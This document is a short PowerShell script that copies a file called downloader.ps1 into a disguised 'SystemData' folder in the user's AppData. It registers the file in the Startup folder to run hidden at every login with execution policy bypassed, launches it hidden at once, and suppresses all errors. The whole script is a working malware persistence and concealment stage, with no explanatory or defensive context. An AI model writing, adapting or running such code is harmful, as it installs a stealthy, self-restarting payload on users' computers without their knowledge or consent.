Try {
    $src = "E:\downloader.ps1" # Change this path to the actual location of downloader.ps1

    # Create destination folder if it doesn't exist
    $destFolder = Join-Path ([Environment]::GetFolderPath('ApplicationData')) 'SystemData'
    New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
    $dest = Join-Path $destFolder 'downloader.ps1'

    # Copy the downloader.ps1 script to the destination folder
    Copy-Item -Path $src -Destination $dest -Force

    # Create a shortcut in the Startup folder to run the script at user login
    $startup = [Environment]::GetFolderPath('Startup')
    $shortcutPath = Join-Path $startup 'downloader.lnk'

    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"

    # Set arguments to run the script hidden
    $shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
    $shortcut.WorkingDirectory = $destFolder
    $shortcut.Save()

    # Execute the script immediately in a hidden window
    $runCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
    
    # Run the command hidden
    $WshShell.Run($runCmd, 0, $false)

} Catch {
    # If an error occurs.
    return
}
